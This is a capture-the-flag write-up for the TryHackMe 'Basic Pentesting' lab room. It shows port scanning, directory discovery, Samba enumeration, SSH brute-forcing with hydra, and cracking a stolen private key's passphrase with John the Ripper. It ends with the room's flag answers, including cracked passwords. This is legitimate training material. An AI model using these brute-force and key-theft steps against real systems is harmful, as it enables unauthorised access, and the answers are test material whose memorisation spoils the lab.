## Basic Pentesting - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/basicpentestingjt)

**IP: 10.10.209.113**

---

## üìå General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Penetration Testing Fundamentals <br>

**Tools Used**: Nmap, Hydra, Gobuster, enum4linux, John The Ripper

**Author**: <br>

mauzware aka mauzinho <br>
[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## üîç Enumeration

- Starting with Nmap scan as always.
  ```
  nmap -A -p- 10.10.209.113
  
  open ports:
  22 -> OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
  80 -> Apache httpd 2.4.18 ((Ubuntu))
  139 -> Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  445 -> Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
  8009 -> Apache Jserv (Protocol v1.3)
  8080 -> Apache Tomcat 9.0.7
  
  Host script results:
  | smb2-time: 
  |   date: 2025-04-23T18:25:37
  |_  start_date: N/A
  | smb-os-discovery: 
  |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
  |   Computer name: basic2
  |   NetBIOS computer name: BASIC2\x00
  |   Domain name: \x00
  |   FQDN: basic2
  |_  System time: 2025-04-23T14:25:37-04:00
  | smb-security-mode: 
  |   account_used: guest
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled but not required
  |_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 0s
  |_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
  ```
  
- Now looking for hiddent assets with Gobuster.
  ```
  gobuster dir -u http://10.10.209.113 -w=/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
  /development
  ```
  
- When I visited `http://10.10.209.113/development` I found two files: dev.txt and j.txt. Let's check them real quick.
  ```
  dev.txt 

  2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
  to host that on this server too. Haven't made any real web apps yet, but I have tried that example
  you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
  using version 2.5.12, because other versions were giving me trouble. -K
  
  2018-04-22: SMB has been configured. -K
  
  2018-04-21: I got Apache set up. Will put in our content later. -J

  j.txt 

  For J:
  
  I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
  and I was able to crack your hash really easily. You know our password policy, so please follow
  it? Change that password ASAP.
  
  -K
  ```

- Since I work with `samba` let's enumerate that as well.
  ```
  enum4linux -a 10.10.209.113
  Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
  [+] Attempting to map shares on 10.10.209.113
  
  //10.10.209.113/Anonymous       Mapping: OK Listing: OK Writing: N/A
  ```

---

## üßç User Privilege Escalation

- Found share named `Anonymous` with `enum4linux`, connect to that share with `smbclient`.
  ```
  smbclient //10.10.209.113/Anonymous
  ```
  
- I'm in legoooo! Looking for more info, found `staff.txt`, downloaded it and checked it.
  ```
  get staff.txt
  cat staff.txt 
  ```
  
- Perfect, I found users Jan and Kay, so they added notes on development page as J. and K.

- Now moving to brute forcing since I already found Jan as valid username.
  ```
  hydra -l jan -P /rockyou.txt -t 16 -I 10.10.209.113 ssh
  ``` 

- Perfect, now I have Jan's password which is `armando`. The last thing I have to do is to find Kay's password.

---

## üëë Root Privilege Escalation

- Now I connected to target machine with SSH as Jan and then tried to get Kay's password. Kay's password is in the file `pass.bak` which I couldn't check due to permission control.
  ```
  ssh jan@10.10.209.113
  armando

  cd home/kay
  ls -al
  
  cd .ssh
  
  ls -al
  id_rsa
  id_rsa.pub
  ```
  
- Found `id_rsa` which is the key for last flag. Download it, convert it to hash and crack the hash, change its permission and connect again with it as user Kay.
  ```
  ssh2john id_rsa > kay_id_rsa.hash
  
  john --wordlist=/rockyou.txt kay_id_rsa.hash
  beeswax (id_rsa)
  
  chmod 600 id_rsa
  
  ssh -i id_rsa kay@10.10.209.113
  passphrase: beeswax
  ```
  
- Awesome! I'm in as Kay, let's check the `pass.bak` file for the last flag.
  ```
  cat pass.bak
  heresareallystrongpasswordthatfollowsthepasswordpolicy$$
  ```

---

## üèÅ Flags

- **What is the name of the hidden directory on the web server(enter name without /)?**: `development`
- **What is the username?**: `jan`
- **What is the password?**: `armando`
- **What service do you use to access the server(answer in abbreviation in all caps)?**: `SSH`
- **What is the name of the other user you found(all lower case)?:** `kay`
- **What is the final password you obtain?**: `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`

---

## üí¨ Notes & Reflections

- What was challenging in this room for me?
  `Nothing, just sharpening my skills.`

- What did I learn?
  `Nothing, just sharpening my skills.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! ü§ü

---
